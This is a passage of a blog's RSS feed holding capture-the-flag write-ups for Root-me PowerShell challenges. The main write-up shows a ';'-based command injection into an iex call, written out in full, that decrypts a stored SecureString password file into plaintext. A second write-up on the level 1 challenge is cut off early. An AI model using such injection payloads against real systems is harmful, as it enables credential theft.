        <link href="http://localhost:4000/R-command-execution-root-me"/>
        <guid isPermaLink="true">http://localhost:4000/R-command-execution-root-me</guid>
      </item>
    
      <item>
        <title>Powershell - SecureString - root-me.org</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Let’s do the level 2 of the Powershell - Command Injection CTF. You can check it out the level 1 write up &lt;a href=&quot;/powershell-command-injection-root-me&quot;&gt;here&lt;/a&gt;. This CTF can be found under the App Script tab on &lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
&lt;p&gt;Let’s check the statement:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Statement&lt;/p&gt;

  &lt;p&gt;Recover the database’s password, with a twist!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We have basically the same problem as the level 1, but with a probable more secure password to hack. To ssh into the machine, we need to run:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2225 app-script-ch19@challenge05.root-me.org&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and provide the password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch19&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;Let’s keep our approach mindset. For those who may not be closely following every release of our write-ups, this mindset is founded on four steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Understanding basic concepts&lt;/li&gt;
  &lt;li&gt;Understanding the problem&lt;/li&gt;
  &lt;li&gt;Crafting an attack&lt;/li&gt;
  &lt;li&gt;Solving&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;These steps are interconnected, and when followed methodically, they make the subsequent steps more straightforward.&lt;/p&gt;

&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;

&lt;p&gt;We have already covered the powershell basics &lt;a href=&quot;/powershell-command-injection-root-me#step-1---understanding-basic-concepts&quot;&gt;here&lt;/a&gt;. However, what is the ‘PowerShell SecureString’? This was my first question, since I’m not at all fluent in this script language.&lt;/p&gt;

&lt;p&gt;As described by Microsoft:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; cmdlet converts plain text to secure strings. […] The secure string can be converted back to an encrypted, standard string using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertFrom-SecureString&lt;/code&gt; cmdlet. This enables it to be stored in a file for later use.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;One example of how we can use this is by creating a variable that reads user input and convert it to a secure string. Let’s see how this works by opening our Linux powershell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Read-Host &lt;span class=&quot;nt&quot;&gt;-AsSecureString&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;
PS /home/kaizen&amp;gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;                        
System.Security.SecureString
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, the input has been converted to a secure string and we are not able to read it. We can encrypt our secure string by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertFrom-SecureString&lt;/code&gt; cmdlet:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertFrom-SecureString &lt;span class=&quot;nt&quot;&gt;-SecureString&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;
PS /home/kaizen&amp;gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt;                                            
6800690020006d006f006d00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, to recover the secure string, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; cmdlet onto the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$encrypted&lt;/code&gt; variable we created:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span class=&quot;nt&quot;&gt;-String&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt;       
PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure2&lt;/span&gt;
System.Security.SecureString
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We could also create a secure string from an encrypted file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertFrom-SecureString &lt;span class=&quot;nt&quot;&gt;-SecureString&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1..16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt; | Set-Content encrypted.txt                                  
PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content ./encrypted.txt | ConvertTo-SecureString &lt;span class=&quot;nt&quot;&gt;-Key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1..16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure2&lt;/span&gt;
System.Security.SecureString
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is just the basics. If you are interesting in learning more aboute secure strings, go check it out at the &lt;a href=&quot;https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.4&quot;&gt;Microsoft&lt;/a&gt; official documentation.&lt;/p&gt;

&lt;h2 id=&quot;-step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt; Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;Let’s ssh into the machine and check it out. As soon as we are in, we are greeted with a CLI program, same as the level 1:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Table to dump:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Well, since we have already solved level 1, let’s use our approach to gather information. Let’s run our command injection &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; ls&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table


    Directory: C:&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;ygwin64&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;hallenge&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp-script&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;h19


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       12/12/2021   9:25 AM             43 .git
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       10/29/2020   9:27 AM            361 .passwd.crypt
&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;       12/12/2021   9:50 AM            748 ._perms
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       10/29/2020   9:23 AM            176 AES.key
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       10/29/2020   9:30 AM            331 ch19.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nice! We have access to all of these files. But it seems our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt; is encrypted. Let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat .passwd.crypt&lt;/code&gt; to see:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .passwd.crypt
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table
76492d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQARQBqAEEAR
QBPAEEAPQA9AHwAMgAyAGMANQA1ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAANwA3ADIAYgBkADYANg
AyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIAMgA1AGYANgBkAGYAYgAxAGMAMgAwADUANQB
kADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYAMAAyADgAZAAwADEAMgBmAGEAZQBmADgANAAy
ADkA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yep. This is not the answer, or else this problem would’ve been the same as the first one. Let’s take a look at the code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch19.ps1&lt;/code&gt; running the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat ch19.ps1&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$KeyFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AES.key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$KeyFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;crypt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Table to dump:&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoNewLine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Read-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Write-Host Connect to the database With the secure Password: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
. Backup the table &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hm. Interesting. So we could access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$SecurePassword&lt;/code&gt; variable, which might be a secure string version of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd.crypt&lt;/code&gt;. To do this, we simply run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table
System.Security.SecureString
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, we were right. This problem is using the techniques we found by Microsoft documentation to decrypt the password with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; cmdlet.&lt;/p&gt;

&lt;p&gt;Since we are able to access the powershell shell, we just need to find the command sequence to transform the secure string in readable format. One way to do that is by creating a variable that converts a secure string into a binary string (BSTR). This &lt;a href=&quot;https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text&quot;&gt;post&lt;/a&gt; talks about this.&lt;/p&gt;

&lt;p&gt;As we can see, we need a series of commands to get what we want. Before attempting on the machine, let’s try it out on my local PCs:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;
System.Security.SecureString
PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marshal]::SecureStringToBSTR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        
PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt;
140321549720616
PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$unsecure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marshal]::PtrToStringAuto&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PS /home/kaizen&amp;gt; &lt;span class=&quot;nv&quot;&gt;$unsecure&lt;/span&gt;
hacked
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But how could we get the plain text version of our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;? Well, that is where we get to our step 3.&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;Now that we understand the basic concepts and the CTF problem, the solution becomes clearer. Take a sip of your coffee, sit back and enjoy our findings!&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;We could detect a command injection vulnerability in this powershell CLI, where when user passes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; pipe, we can execute arbitrary code.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;We know how to convert secure string into plain text.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Uniting both, we can build the perfect attack! How about something like:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content &lt;span class=&quot;nv&quot;&gt;$KeyFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content .passwd.crypt |
ConvertTo-SecureString &lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marsh
al]::SecureStringToBSTR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PlainPassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.Inter
opServices.Marshal]::PtrToStringAuto&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PlainPassword&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s understand this injection: first, we create a variable called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$key2&lt;/code&gt; which will read the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$KeyFile&lt;/code&gt; variable. After that, we proceed to decrypt the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd.crypt&lt;/code&gt; into a secure string using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; cmdlet, storing the result into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$SecurePassword&lt;/code&gt; variable. After that, we simply apply our conversion from secure string to binary string, then to plain text, as we did in Step 2.&lt;/p&gt;

&lt;p&gt;If everything runs smoothly, we shall solve this problem.&lt;/p&gt;

&lt;h2 id=&quot;-step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt; Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;Let’s try our attack payload to see what happens:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content &lt;span class=&quot;nv&quot;&gt;$KeyFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-Content .passwd.crypt | ConvertTo
&lt;span class=&quot;nt&quot;&gt;-SecureString&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marshal]::SecureStringT
oBSTR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PlainPassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;System.Runtime.InteropServices.Marshal]::PtrToS
tringAuto&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BSTR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PlainPassword&lt;/span&gt;
Connect to the database With the secure Password: System.Security.SecureString. Backup th
e table
SecureStringBypass
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And there we have it! Our flag!&lt;/p&gt;

&lt;h1 id=&quot;-conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt; Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we understood how secure strings work in powershell. We learned how to create secure strings and how to convert them back to a binary string. We also learned how to encrypt &amp;amp; decrypt secure strings using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertTo-SecureString&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConvertFrom-SecureString&lt;/code&gt; cmdlets.&lt;/p&gt;

&lt;p&gt;We were able to solve this challenge because we found a command injection (thanks to our level 1 solution), followed by the conversion from secure string to binary string.&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 12 Dec 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000//powershell-securestring-root-me</link>
        <link href="http://localhost:4000/powershell-securestring-root-me"/>
        <guid isPermaLink="true">http://localhost:4000/powershell-securestring-root-me</guid>
      </item>
    
      <item>
        <title>Powershell - Command Injection - root-me.org</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;In this write-up, we’re taking a different route by tackling a Windows machine CTF. This CTF is hosted at &lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt; in the App Script tab. It is also ranked as easy! Let’s see what we have.&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;The ‘Statement’ says:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Statement&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Recover the database’s password.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A cryptic task, indeed! It seems we need to ssh into the machine to take a look and understand what this CTF is about. However, before doing so, let’s brush up on Powershell and command injection to sharpen our strategic approach mindset.&lt;/p&gt;

&lt;p&gt;To ssh into the machine, we run the command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2225 app-script-ch18@challenge05.root-me.org&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;with the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch18&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;

&lt;h3 id=&quot;powershell-101&quot;&gt;Powershell 101&lt;/h3&gt;

